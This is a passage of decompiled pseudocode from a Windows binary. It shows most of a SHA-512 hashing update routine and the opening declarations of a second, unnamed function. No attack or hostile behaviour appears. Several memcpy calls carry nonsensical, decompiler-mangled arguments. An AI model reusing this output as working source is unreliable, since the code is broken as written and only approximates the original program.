  unsigned int v117; // [rsp+40h] [rbp-3C8h]
  unsigned int v118; // [rsp+44h] [rbp-3C4h]
  unsigned int v119; // [rsp+48h] [rbp-3C0h]
  unsigned int v120; // [rsp+48h] [rbp-3C0h]
  unsigned int v121; // [rsp+4Ch] [rbp-3BCh]
  unsigned int v122; // [rsp+4Ch] [rbp-3BCh]
  unsigned int v123; // [rsp+50h] [rbp-3B8h]
  int v124; // [rsp+54h] [rbp-3B4h]
  unsigned __int64 v125; // [rsp+58h] [rbp-3B0h]
  unsigned int v126; // [rsp+60h] [rbp-3A8h]
  unsigned int v127; // [rsp+64h] [rbp-3A4h]
  unsigned int v128; // [rsp+68h] [rbp-3A0h]
  unsigned int v129; // [rsp+6Ch] [rbp-39Ch]
  int v130; // [rsp+70h] [rbp-398h]
  unsigned int v131; // [rsp+74h] [rbp-394h]
  unsigned int v132; // [rsp+78h] [rbp-390h]
  int v133; // [rsp+7Ch] [rbp-38Ch]
  unsigned int v134; // [rsp+80h] [rbp-388h]
  unsigned int v135; // [rsp+84h] [rbp-384h]
  unsigned int v136; // [rsp+88h] [rbp-380h]
  unsigned int v137; // [rsp+8Ch] [rbp-37Ch]
  unsigned int v138; // [rsp+90h] [rbp-378h]
  unsigned int v139; // [rsp+94h] [rbp-374h]
  unsigned int v140; // [rsp+98h] [rbp-370h]
  unsigned int v141; // [rsp+9Ch] [rbp-36Ch]
  _DWORD *v142; // [rsp+A0h] [rbp-368h]
  __int64 v143; // [rsp+A8h] [rbp-360h]
  char *v144; // [rsp+B0h] [rbp-358h]
  int v145; // [rsp+B8h] [rbp-350h]
  _QWORD v146[105]; // [rsp+C0h] [rbp-348h]

  v5 = a5;
  v6 = a3;
  v8 = 0LL;
  v9 = a5;
  do
  {
    v10 = __CFADD__(v9, a4[v8 + 49]);
    a4[v8++ + 49] += v9;
    v9 = v10;
  }
  while ( v8 != 4 );
  v11 = a4[48] + a5;
  if ( a4[48] && v11 < 128 )
  {
    result = memcpy(a3, (const void *)(int)a5, (size_t)a3);
    LODWORD(v5) = a4[48] + v5;
  }
  else
  {
    if ( v11 >= 128 )
    {
      v142 = a4;
      do
      {
        memcpy(v6, (const void *)v5, (size_t)v6);
        v143 = 128LL - (int)a4[48];
        for ( i = 0LL; i != 16; ++i )
        {
          v14 = _byteswap_ulong(a4[2 * i + 17]);
          LODWORD(v146[i + 80]) = _byteswap_ulong(a4[2 * i + 16]);
          HIDWORD(v146[i + 80]) = v14;
        }
        v144 = v6;
        v145 = v5;
        for ( j = 0LL; j != 16; j += 2LL )
          *(_OWORD *)&v146[j] = *(_OWORD *)&v146[j + 80];
        v16 = v146[0];
        v17 = HIDWORD(v146[0]);
        v18 = 0LL;
        v19 = v146[0];
        do
        {
          HIDWORD(v21) = v146[v18 + 14];
          LODWORD(v21) = HIDWORD(v146[v18 + 14]);
          v20 = v21 >> 19;
          HIDWORD(v21) = v21;
          LODWORD(v21) = v146[v18 + 14];
          v22 = v21 >> 19;
          HIDWORD(v21) = HIDWORD(v146[v18 + 14]);
          v23 = v20 ^ (v21 >> 29);
          HIDWORD(v21) = v21;
          LODWORD(v21) = HIDWORD(v146[v18 + 14]);
          v24 = v16 + (v22 ^ (v21 >> 29) ^ (LODWORD(v146[v18 + 14]) >> 6));
          v16 = v146[v18 + 1];
          v25 = HIDWORD(v146[v18 + 1]);
          v26 = (v23 ^ (v21 >> 6))
              + ((__PAIR64__(v16, v25) >> 1) ^ (__PAIR64__(v16, v25) >> 8) ^ (__PAIR64__(v16, v25) >> 7));
          v27 = __PAIR64__(
                  (__PAIR64__(
                     (__PAIR64__(v25, v16) >> 1) ^ (__PAIR64__(v25, v16) >> 8) ^ (v16 >> 7),
                     v23 ^ (unsigned int)(v21 >> 6))
                 + __PAIR64__(
                     LODWORD(v146[v18 + 9]) + v24,
                     (__PAIR64__(v16, v25) >> 1) ^ (__PAIR64__(v16, v25) >> 8) ^ (__PAIR64__(v16, v25) >> 7))) >> 32,
                  v17)
              + __PAIR64__(__CFADD__(HIDWORD(v146[v18 + 9]), v26), HIDWORD(v146[v18 + 9]) + v26);
          HIDWORD(v146[v18 + 16]) = v17 + HIDWORD(v146[v18 + 9]) + v26;
          LODWORD(v146[v18++ + 16]) = HIDWORD(v27);
          v17 = v25;
        }
        while ( v18 != 64 );
        v28 = *a4;
        v126 = a4[4];
        v127 = a4[6];
        v29 = a4[8];
        v128 = a4[10];
        v125 = 0LL;
        v129 = a4[1];
        v131 = *a4;
        v130 = a4[3];
        v116 = v130;
        v133 = a4[2];
        v105 = v133;
        v132 = a4[5];
        v108 = __PAIR64__(v126, v132);
        v134 = a4[7];
        v112 = v134;
        v30 = v127;
        v135 = a4[9];
        v31 = v135;
        v137 = v29;
        v136 = a4[11];
        v114 = v136;
        v32 = v128;
        v138 = a4[13];
        v110 = v138;
        v140 = a4[12];
        v107 = v140;
        v139 = a4[15];
        v103 = v139;
        v141 = a4[14];
        v121 = v141;
        v33 = v129;
        v34 = HIDWORD(v19);
        v35 = v19;
        while ( 1 )
        {
          v123 = v31;
          v36 = *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 1)
              + ((__PAIR64__(v29, v31) >> 14) ^ (__PAIR64__(v29, v31) >> 18) ^ (__PAIR64__(v31, v29) >> 9))
              + (v110 & ~v31 | v31 & v114);
          v37 = __PAIR64__(
                  (__PAIR64__(
                     *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125),
                     *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 1))
                 + __PAIR64__(
                     v121,
                     (__PAIR64__(v29, v31) >> 14) ^ (__PAIR64__(v29, v31) >> 18) ^ (__PAIR64__(v31, v29) >> 9))
                 + __PAIR64__(
                     (v107 & ~v29)
                   + ((__PAIR64__(v31, v29) >> 14) ^ (__PAIR64__(v31, v29) >> 18) ^ (__PAIR64__(v29, v31) >> 9))
                   + v35
                   + (v29 & v32),
                     v110 & ~v31 | v31 & v114)) >> 32,
                  v103)
              + __PAIR64__(__CFADD__(v34, v36), v34 + v36);
          v38 = __PAIR64__(v33, v28) >> 28;
          v39 = __PAIR64__(v28, v33) >> 2;
          v40 = v33;
          v119 = v33;
          v41 = (__PAIR64__(v28, v33) >> 28) ^ (__PAIR64__(v33, v28) >> 2) ^ (__PAIR64__(v33, v28) >> 7);
          v124 = v40 & v116;
          v104 = v28 & v105;
          v118 = v28;
          v42 = v40 & v116 ^ v108 & (v40 ^ v116);
          v43 = (v38 ^ v39 ^ (__PAIR64__(v28, v40) >> 7))
              + __CFADD__(v41, v42)
              + (v28 & v105 ^ HIDWORD(v108) & (v28 ^ v105));
          v46 = v37 + __PAIR64__(v30, v112);
          v45 = (v37 + __PAIR64__(v30, v112)) >> 32;
          v44 = v46;
          v49 = v37 + __PAIR64__(v43, v41 + v42);
          v47 = (v37 + __PAIR64__(v43, v41 + v42)) >> 32;
          v48 = v49;
          v50 = (__PAIR64__(v45, v44) >> 14) ^ (__PAIR64__(v45, v44) >> 18) ^ (__PAIR64__(v44, v45) >> 9);
          v113 = v46;
          v51 = __PAIR64__(
                  (__PAIR64__(
                     ((__PAIR64__(v44, v45) >> 14) ^ (__PAIR64__(v44, v45) >> 18) ^ (__PAIR64__(v45, v44) >> 9))
                   + (v32 & ~v45)
                   + (v29 & v45)
                   + LODWORD(v146[v125 + 1])
                   + *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 2)
                   + v107,
                     *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 3))
                 + __PAIR64__(__CFADD__(v50, v114 & ~v44 | v31 & v44), v50 + (v114 & ~v44 | v31 & v44))) >> 32,
                  v110)
              + __PAIR64__(
                  __CFADD__(
                    HIDWORD(v146[v125 + 1]),
                    *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 3) + v50 + (v114 & ~v44 | v31 & v44)),
                  HIDWORD(v146[v125 + 1])
                + *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 3)
                + v50
                + (v114 & ~v44 | v31 & v44));
          v52 = v47;
          v122 = v47;
          v53 = (v51 + v108) >> 32;
          v56 = v51
              + __PAIR64__(
                  (__PAIR64__(v48, v47) >> 28) ^ (__PAIR64__(v47, v48) >> 2) ^ (__PAIR64__(v47, v48) >> 7),
                  (__PAIR64__(v47, v48) >> 28) ^ (__PAIR64__(v48, v47) >> 2) ^ (__PAIR64__(v48, v47) >> 7))
              + __PAIR64__(v118 & v47 ^ v104 ^ v105 & v47, v119 & v48 ^ v124 ^ v116 & v48);
          v55 = HIDWORD(v56);
          HIDWORD(v57) = v51 + v108;
          LODWORD(v57) = v53;
          v58 = ((v51 + v108) >> 14) ^ ((v51 + v108) >> 18) ^ (__PAIR64__((int)v51 + (int)v108, v53) >> 9);
          v59 = (__PAIR64__((int)v51 + (int)v108, v57) >> 14) ^ (v57 >> 18) ^ ((v51 + v108) >> 9);
          v109 = v51 + v108;
          v54 = v109;
          v60 = *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 5) + v58 + (v123 & ~v54 | v46 & v54);
          v61 = __PAIR64__(
                  (__PAIR64__(
                     v59
                   + (v29 & ~v53)
                   + (v45 & v53)
                   + LODWORD(v146[v125 + 2])
                   + *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 4)
                   + v32,
                     *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 5))
                 + __PAIR64__(__CFADD__(v58, v123 & ~v54 | v113 & v54), v58 + (v123 & ~v54 | v113 & v54))) >> 32,
                  v114)
              + __PAIR64__(__CFADD__(HIDWORD(v146[v125 + 2]), v60), HIDWORD(v146[v125 + 2]) + v60);
          v111 = v56;
          v62 = HIDWORD(v61) + __CFADD__((_DWORD)v61, v116) + v105;
          v63 = (v61
               + __PAIR64__(
                   (__PAIR64__(v56, HIDWORD(v56)) >> 28) ^ (v56 >> 2) ^ (v56 >> 7),
                   (v56 >> 28) ^ (__PAIR64__(v56, HIDWORD(v56)) >> 2) ^ (__PAIR64__(v56, HIDWORD(v56)) >> 7))
               + __PAIR64__(v122 & HIDWORD(v56) ^ v118 & v52 ^ v118 & HIDWORD(v56), v48 & v56 ^ v119 & v48 ^ v119 & v56)) >> 32;
          v64 = v61
              + ((v56 >> 28) ^ (__PAIR64__(v56, HIDWORD(v56)) >> 2) ^ (__PAIR64__(v56, HIDWORD(v56)) >> 7))
              + (v48 & v56 ^ v119 & v48 ^ v119 & v56);
          HIDWORD(v57) = v62;
          LODWORD(v57) = v61 + v116;
          v65 = v57 >> 14;
          HIDWORD(v57) = v61 + v116;
          LODWORD(v57) = v62;
          v66 = v57 >> 14;
          HIDWORD(v57) = v62;
          LODWORD(v57) = v61 + v116;
          v67 = v65 ^ (v57 >> 18);
          LODWORD(v57) = v62;
          v106 = v62;
          v117 = v61 + v116;
          HIDWORD(v57) = v117;
          v68 = *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 7)
              + (v67 ^ (__PAIR64__(v117, v62) >> 9))
              + (v46 & ~v117 | v109 & v117);
          v69 = __PAIR64__(
                  (__PAIR64__(
                     (v66 ^ (v57 >> 18) ^ (__PAIR64__(v62, v117) >> 9))
                   + (v45 & ~v62)
                   + (HIDWORD(v109) & v62)
                   + LODWORD(v146[v125 + 3])
                   + *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 6)
                   + v29,
                     *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 7))
                 + __PAIR64__(
                     __CFADD__(v67 ^ (__PAIR64__(v117, v62) >> 9), v113 & ~v117 | v109 & v117),
                     (v67 ^ (__PAIR64__(v117, v62) >> 9)) + (v113 & ~v117 | v109 & v117))) >> 32,
                  v123)
              + __PAIR64__(__CFADD__(HIDWORD(v146[v125 + 3]), v68), HIDWORD(v146[v125 + 3]) + v68);
          v115 = v64;
          v70 = HIDWORD(v69) + __CFADD__((_DWORD)v69, v119) + v118;
          v72 = (__PAIR64__(
                   (__PAIR64__(
                      (v66 ^ (v57 >> 18) ^ (__PAIR64__(v62, v117) >> 9))
                    + (v45 & ~v62)
                    + (HIDWORD(v109) & v62)
                    + LODWORD(v146[v125 + 3])
                    + *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 6)
                    + v29,
                      *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 7))
                  + __PAIR64__(
                      __CFADD__(v67 ^ (__PAIR64__(v117, v62) >> 9), v113 & ~v117 | v109 & v117),
                      (v67 ^ (__PAIR64__(v117, v62) >> 9)) + (v113 & ~v117 | v109 & v117))) >> 32,
                   v123)
               + __PAIR64__(__CFADD__(HIDWORD(v146[v125 + 3]), v68), HIDWORD(v146[v125 + 3]) + v68)
               + __PAIR64__(
                   (__PAIR64__(v64, v63) >> 28) ^ (__PAIR64__(v63, v64) >> 2) ^ (__PAIR64__(v63, v64) >> 7),
                   (__PAIR64__(v63, v64) >> 28) ^ (__PAIR64__(v64, v63) >> 2) ^ (__PAIR64__(v64, v63) >> 7))
               + __PAIR64__(v55 & v63 ^ v122 & v55 ^ v122 & v63, v56 & v64 ^ v49 & v56 ^ v49 & v64)) >> 32;
          v71 = v69
              + ((__PAIR64__(v63, v64) >> 28) ^ (__PAIR64__(v64, v63) >> 2) ^ (__PAIR64__(v64, v63) >> 7))
              + (v56 & v64 ^ v49 & v56 ^ v49 & v64);
          HIDWORD(v57) = v70;
          LODWORD(v57) = v69 + v119;
          v73 = v57 >> 14;
          HIDWORD(v57) = v69 + v119;
          LODWORD(v57) = v70;
          v74 = v57 >> 14;
          HIDWORD(v57) = v70;
          LODWORD(v57) = v69 + v119;
          v75 = v73 ^ (v57 >> 18);
          LODWORD(v57) = v70;
          v120 = v69 + v119;
          HIDWORD(v57) = v120;
          v76 = *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 9)
              + (v75 ^ (__PAIR64__(v120, v70) >> 9))
              + (v109 & ~v120 | v117 & v120);
          v77 = __PAIR64__(
                  (__PAIR64__(
                     (v74 ^ (v57 >> 18) ^ (__PAIR64__(v70, v120) >> 9))
                   + (HIDWORD(v109) & ~v70)
                   + (v106 & v70)
                   + LODWORD(v146[v125 + 4])
                   + *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 8)
                   + v45,
                     *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 9))
                 + __PAIR64__(
                     __CFADD__(v75 ^ (__PAIR64__(v120, v70) >> 9), v109 & ~v120 | v117 & v120),
                     (v75 ^ (__PAIR64__(v120, v70) >> 9)) + (v109 & ~v120 | v117 & v120))) >> 32,
                  v46)
              + __PAIR64__(__CFADD__(HIDWORD(v146[v125 + 4]), v76), HIDWORD(v146[v125 + 4]) + v76);
          v79 = (__PAIR64__(
                   (__PAIR64__(v71, v72) >> 28) ^ ((v69
                                                  + __PAIR64__(
                                                      (__PAIR64__(v64, v63) >> 28) ^ (__PAIR64__(v63, v64) >> 2) ^ (__PAIR64__(v63, v64) >> 7),
                                                      (__PAIR64__(v63, v64) >> 28) ^ (__PAIR64__(v64, v63) >> 2) ^ (__PAIR64__(v64, v63) >> 7))
                                                  + __PAIR64__(
                                                      v55 & v63 ^ v122 & v55 ^ v122 & v63,
                                                      v56 & v64 ^ v49 & v56 ^ v49 & v64)) >> 2) ^ ((v69
                                                                                                  + __PAIR64__((__PAIR64__(v64, v63) >> 28) ^ (__PAIR64__(v63, v64) >> 2) ^ (__PAIR64__(v63, v64) >> 7), (__PAIR64__(v63, v64) >> 28) ^ (__PAIR64__(v64, v63) >> 2) ^ (__PAIR64__(v64, v63) >> 7))
                                                                                                  + __PAIR64__(v55 & v63 ^ v122 & v55 ^ v122 & v63, v56 & v64 ^ v49 & v56 ^ v49 & v64)) >> 7),
                   ((v69
                   + __PAIR64__(
                       (__PAIR64__(v64, v63) >> 28) ^ (__PAIR64__(v63, v64) >> 2) ^ (__PAIR64__(v63, v64) >> 7),
                       (__PAIR64__(v63, v64) >> 28) ^ (__PAIR64__(v64, v63) >> 2) ^ (__PAIR64__(v64, v63) >> 7))
                   + __PAIR64__(v55 & v63 ^ v122 & v55 ^ v122 & v63, v56 & v64 ^ v49 & v56 ^ v49 & v64)) >> 28) ^ (__PAIR64__(v71, v72) >> 2) ^ (__PAIR64__(v71, v72) >> 7))
               + __PAIR64__(v63 & v72 ^ v55 & v63 ^ v55 & v72, v64 & v71 ^ v111 & v64 ^ v111 & v71)) >> 32;
          v78 = (((v69
                 + __PAIR64__(
                     (__PAIR64__(v64, v63) >> 28) ^ (__PAIR64__(v63, v64) >> 2) ^ (__PAIR64__(v63, v64) >> 7),
                     (__PAIR64__(v63, v64) >> 28) ^ (__PAIR64__(v64, v63) >> 2) ^ (__PAIR64__(v64, v63) >> 7))
                 + __PAIR64__(v55 & v63 ^ v122 & v55 ^ v122 & v63, v56 & v64 ^ v49 & v56 ^ v49 & v64)) >> 28) ^ (__PAIR64__(v71, v72) >> 2) ^ (__PAIR64__(v71, v72) >> 7))
              + (v64 & v71 ^ v111 & v64 ^ v111 & v71);
          v80 = (v77 + __PAIR64__(v122, v49)) >> 32;
          v81 = v77 + v49;
          v83 = v77 + __PAIR64__(v79, v78);
          v30 = (v77 + __PAIR64__(v79, v78)) >> 32;
          v82 = v83;
          v84 = ((v77 + __PAIR64__(v122, v49)) >> 14) ^ ((v77 + __PAIR64__(v122, v49)) >> 18) ^ (__PAIR64__(
                                                                                                   (int)v77 + (int)v49,
                                                                                                   v80) >> 9);
          v103 = v77 + v49;
          v121 = v80;
          v85 = *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 11) + v84 + (v117 & ~v81 | v120 & v81);
          v86 = __PAIR64__(
                  (__PAIR64__(
                     ((__PAIR64__(v81, v80) >> 14) ^ (__PAIR64__(v81, v80) >> 18) ^ (__PAIR64__(v80, v81) >> 9))
                   + (v106 & ~v80)
                   + (v70 & v80)
                   + HIDWORD(v109)
                   + *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 10)
                   + LODWORD(v146[v125 + 5]),
                     *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 11))
                 + __PAIR64__(__CFADD__(v84, v117 & ~v81 | v120 & v81), v84 + (v117 & ~v81 | v120 & v81))) >> 32,
                  v109)
              + __PAIR64__(__CFADD__(HIDWORD(v146[v125 + 5]), v85), HIDWORD(v146[v125 + 5]) + v85);
          v112 = v83;
          v87 = (__PAIR64__(
                   (__PAIR64__(v82, v30) >> 28) ^ (__PAIR64__(v30, v82) >> 2) ^ (__PAIR64__(v30, v82) >> 7),
                   (__PAIR64__(v30, v82) >> 28) ^ (__PAIR64__(v82, v30) >> 2) ^ (__PAIR64__(v82, v30) >> 7))
               + __PAIR64__(v72 & v30 ^ v63 & v72 ^ v63 & v30, v71 & v82 ^ v64 & v71 ^ v64 & v82)) >> 32;
          v88 = ((__PAIR64__(v30, v82) >> 28) ^ (__PAIR64__(v82, v30) >> 2) ^ (__PAIR64__(v82, v30) >> 7))
              + (v71 & v82 ^ v64 & v71 ^ v64 & v82);
          v91 = v86 + v56;
          v89 = (v86 + v56) >> 32;
          v90 = v86 + v56;
          v93 = v86 + __PAIR64__(v87, v88);
          v92 = (v86 + __PAIR64__(v87, v88)) >> 32;
          v94 = ((v86 + v56) >> 14) ^ ((v86 + v56) >> 18) ^ (__PAIR64__((int)v86 + (int)v56, v89) >> 9);
          v110 = v86 + v56;
          v95 = *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 13) + v94 + (v120 & ~v90 | (v77 + v49) & v90);
          v97 = __PAIR64__(
                  (__PAIR64__(
                     ((__PAIR64__(v91, v89) >> 14) ^ (__PAIR64__(v91, v89) >> 18) ^ ((v86 + v56) >> 9))
                   + (v70 & ~v89)
                   + (v121 & v89)
                   + v106
                   + *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 12)
                   + LODWORD(v146[v125 + 6]),
                     *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 13))
                 + __PAIR64__(
                     __CFADD__(v94, v120 & ~(_DWORD)v91 | v103 & v91),
                     v94 + (v120 & ~(_DWORD)v91 | v103 & v91))) >> 32,
                  v117)
              + __PAIR64__(__CFADD__(HIDWORD(v146[v125 + 6]), v95), HIDWORD(v146[v125 + 6]) + v95)
              + __PAIR64__(v63, v115);
          v32 = HIDWORD(v97);
          v96 = v97;
          v98 = __PAIR64__(
                  (__PAIR64__(
                     ((__PAIR64__(v90, v89) >> 14) ^ (__PAIR64__(v90, v89) >> 18) ^ ((v86 + v56) >> 9))
                   + (v70 & ~v89)
                   + (v121 & v89)
                   + v106
                   + *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 12)
                   + LODWORD(v146[v125 + 6]),
                     *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 13))
                 + __PAIR64__(__CFADD__(v94, v120 & ~v90 | v103 & v90), v94 + (v120 & ~v90 | v103 & v90))) >> 32,
                  v117)
              + __PAIR64__(__CFADD__(HIDWORD(v146[v125 + 6]), v95), HIDWORD(v146[v125 + 6]) + v95)
              + __PAIR64__(
                  (__PAIR64__(v93, v92) >> 28) ^ (__PAIR64__(v92, v93) >> 2) ^ (__PAIR64__(v92, v93) >> 7),
                  (__PAIR64__(v92, v93) >> 28) ^ (__PAIR64__(v93, v92) >> 2) ^ (__PAIR64__(v93, v92) >> 7))
              + __PAIR64__(v30 & v92 ^ v72 & v30 ^ v72 & v92, v82 & v93 ^ v71 & v82 ^ v71 & v93);
          v99 = (__PAIR64__(v32, v96) >> 14) ^ (__PAIR64__(v32, v96) >> 18) ^ (__PAIR64__(v96, v32) >> 9);
          v114 = v97;
          v107 = v89;
          v100 = *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 15)
               + v99
               + ((v77 + v49) & ~v96 | (v86 + v56) & v96);
          v108 = __PAIR64__(v92, v93);
          v105 = HIDWORD(v98);
          v116 = v98;
          v101 = __PAIR64__(
                   (__PAIR64__(
                      ((__PAIR64__(v96, v32) >> 14) ^ (__PAIR64__(v96, v32) >> 18) ^ (__PAIR64__(v32, v96) >> 9))
                    + (v121 & ~v32)
                    + (v89 & v32)
                    + v70
                    + *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 14)
                    + LODWORD(v146[v125 + 7]),
                      *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 15))
                  + __PAIR64__(__CFADD__(v99, v103 & ~v96 | v110 & v96), v99 + (v103 & ~v96 | v110 & v96))) >> 32,
                   v120)
               + __PAIR64__(__CFADD__(HIDWORD(v146[v125 + 7]), v100), HIDWORD(v146[v125 + 7]) + v100)
               + __PAIR64__(v72, v71);
          v29 = HIDWORD(v101);
          v31 = v101;
          v102 = __PAIR64__(
                   (__PAIR64__(
                      ((__PAIR64__(v96, v32) >> 14) ^ (__PAIR64__(v96, v32) >> 18) ^ (__PAIR64__(v32, v96) >> 9))
                    + (v121 & ~v32)
                    + (v89 & v32)
                    + v70
                    + *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 14)
                    + LODWORD(v146[v125 + 7]),
                      *((_DWORD *)&SHA512_Constants_14000E1A0 + 2 * v125 + 15))
                  + __PAIR64__(__CFADD__(v99, v103 & ~v96 | v110 & v96), v99 + (v103 & ~v96 | v110 & v96))) >> 32,
                   v120)
               + __PAIR64__(__CFADD__(HIDWORD(v146[v125 + 7]), v100), HIDWORD(v146[v125 + 7]) + v100)
               + __PAIR64__(
                   (__PAIR64__(v98, HIDWORD(v98)) >> 28) ^ (v98 >> 2) ^ (v98 >> 7),
                   (v98 >> 28) ^ (__PAIR64__(v98, HIDWORD(v98)) >> 2) ^ (__PAIR64__(v98, HIDWORD(v98)) >> 7))
               + __PAIR64__(v30 & v92 ^ HIDWORD(v98) & (v30 ^ v92), v112 & v93 ^ v98 & (v112 ^ v93));
          v28 = HIDWORD(v102);
          v33 = v102;
          if ( v125 > 0x47 )
            break;
          v35 = v146[v125 + 8];
          v34 = HIDWORD(v146[v125 + 8]);
          v125 += 8LL;
        }
        v6 = &v144[v143];
        v5 = (unsigned int)(v145 - v143);
        a4 = v142;
        v142[1] = v129 + v102;
        *v142 = (__PAIR64__(v131, v129) + v102) >> 32;
        v142[3] = v130 + v98;
        v142[2] = v133 + __CFADD__(v130, (_DWORD)v98) + HIDWORD(v98);
        v142[5] = v132 + v108;
        v142[4] = v126 + __CFADD__(v132, (_DWORD)v108) + HIDWORD(v108);
        v142[7] = v134 + v83;
        v142[6] = v127 + __CFADD__(v134, (_DWORD)v83) + v30;
        v142[9] = v135 + v101;
        v142[8] = (__PAIR64__(v137, v135) + v101) >> 32;
        v142[11] = v136 + v97;
        v142[10] = v128 + __CFADD__(v136, (_DWORD)v97) + HIDWORD(v97);
        v142[13] = v138 + v91;
        v142[12] = v140 + __CFADD__(v138, (_DWORD)v91) + v89;
        v142[15] = v139 + v103;
        v142[14] = v141 + __CFADD__(v139, v103) + v121;
        v142[48] = 0;
      }
      while ( (int)v5 > 127 );
    }
    result = memcpy(v6, (const void *)v5, (size_t)v6);
  }
  a4[48] = v5;
  return result;
}

//----- (000000014000A0C7) ----------------------------------------------------
__int64 __fastcall sub_14000A0C7(
        double a1,
        double a2,
        double a3,
        double a4,
        double a5,
        double a6,
        __m128 a7,
        __int64 a8,
        __int64 a9,
        const __m128i *a10,
        _WORD *a11,
        unsigned __int16 *a12)
{
  int v12; // eax
  int v13; // ecx
  int v14; // edx
  int v15; // ebp
  int v16; // ebx
  int v17; // edx
  int v18; // ebp
  int v19; // edx
  int *v20; // r13
  int *v21; // r12
  int *v22; // r15
  char *v23; // r14
  char *v24; // rbp
  int *p_Val; // rsi
  int *v26; // rbx
  int *v27; // rdi
  __int64 v28; // rcx
  unsigned __int8 v29; // r9
  int *v30; // r8
  int v31; // r10d
  int *v32; // rcx
  int *v33; // rdx
  int *v34; // rax
  __m128i v35; // xmm6
  __int64 i; // rax
  __m128i v37; // xmm0
  __m128i v38; // xmm1
  __m128i v39; // xmm2
  __m128i v40; // xmm0
  __m128i v41; // xmm1
  __m128i v42; // xmm1
  __int64 j; // rax
  __m128i v44; // xmm0
  __m128i v45; // xmm1
  __m128i v46; // xmm2
  __m128i v47; // xmm0
  __m128i v48; // xmm1
  __m128i v49; // xmm1
  unsigned __int64 v50; // rax
  __int64 k; // rax
  unsigned __int64 v52; // rax
  __int64 m; // rax
  __int64 v54; // rdx
  __int64 v55; // rdx
  __int64 v56; // rdx
  __int64 v57; // rdx
  unsigned __int64 v58; // rax
  __int64 n; // rax
  __int64 v60; // rdx
  __int64 v61; // rdx
  __int64 v62; // rdx
  __int64 v63; // rdx
  __int64 v64; // rdx
  __int64 ii; // rax
  __int64 jj; // rax
  unsigned __int64 v67; // rax
  __int64 v68; // rdx
  __int64 v69; // rdx
  __int64 kk; // rax
  __m128i v71; // xmm0
  __m128i v72; // xmm1
  __m128i v73; // xmm2
  __m128i v74; // xmm0
  __m128i v75; // xmm1
  __m128i v76; // xmm1
  __int64 mm; // rax
  __m128i v78; // xmm0
  __m128i v79; // xmm1
  __m128i v80; // xmm2
  __m128i v81; // xmm0
  __m128i v82; // xmm1
  __m128i v83; // xmm1
  unsigned int i1; // ebx
  unsigned int i2; // ebx
  unsigned int i3; // ebx
  unsigned int i4; // ebx
  unsigned int i5; // ebx
  unsigned int i6; // ebx
  __int64 i7; // rax
  char v91; // si
  int v92; // eax
  __int64 i8; // rbp
  int v94; // ebx
  int v95; // ebx
  int v96; // edx
  bool v97; // zf
  int v98; // edx
  int v99; // eax
  char v100; // dl
  __int64 i9; // rbp
  __int64 v102; // rbx
  int v103; // ecx
  int v104; // ecx
  __int64 i10; // rdx
  unsigned int v106; // edi
  int v107; // ebx
  unsigned int v108; // eax
  __int64 i11; // rdx
  __int64 v110; // kr00_8
  unsigned int v111; // esi
  unsigned int v112; // r11d
  __int64 v113; // kr08_8
  unsigned int v114; // r9d
  unsigned int v115; // r8d
  _WORD *v116; // rdi
  __int16 v117; // eax^2
  __int64 result; // rax
  unsigned __int8 v119; // [rsp+2Bh] [rbp-B4Dh]
  int v120; // [rsp+2Ch] [rbp-B4Ch]
  __int128 v121[10]; // [rsp+30h] [rbp-B48h] BYREF
  unsigned int nn; // [rsp+D0h] [rbp-AA8h] BYREF
  __int64 v123; // [rsp+D4h] [rbp-AA4h]
  unsigned int v124; // [rsp+DCh] [rbp-A9Ch]
  unsigned int v125; // [rsp+E0h] [rbp-A98h] BYREF
  __int16 v126; // [rsp+E4h] [rbp-A94h]
  __int16 v127; // [rsp+E6h] [rbp-A92h]
  __int64 v128; // [rsp+E8h] [rbp-A90h]
  unsigned int v129; // [rsp+F0h] [rbp-A88h]
  int v130; // [rsp+F4h] [rbp-A84h]
  _WORD *v131; // [rsp+170h] [rbp-A08h]
  __int64 v132; // [rsp+178h] [rbp-A00h]
  __m128i v133; // [rsp+180h] [rbp-9F8h] BYREF
  __m128i v134; // [rsp+190h] [rbp-9E8h]
  __int64 v135[10]; // [rsp+1A0h] [rbp-9D8h] BYREF
  __m128i v136; // [rsp+1F0h] [rbp-988h]
  __m128i v137; // [rsp+200h] [rbp-978h]
  int v138[20]; // [rsp+210h] [rbp-968h] BYREF
  __int128 v139[10]; // [rsp+260h] [rbp-918h] BYREF
  __int64 v140[20]; // [rsp+300h] [rbp-878h] BYREF
  __int128 v141[5]; // [rsp+3A0h] [rbp-7D8h] BYREF
  int v142[40]; // [rsp+3F0h] [rbp-788h] BYREF
  int v143[40]; // [rsp+490h] [rbp-6E8h] BYREF
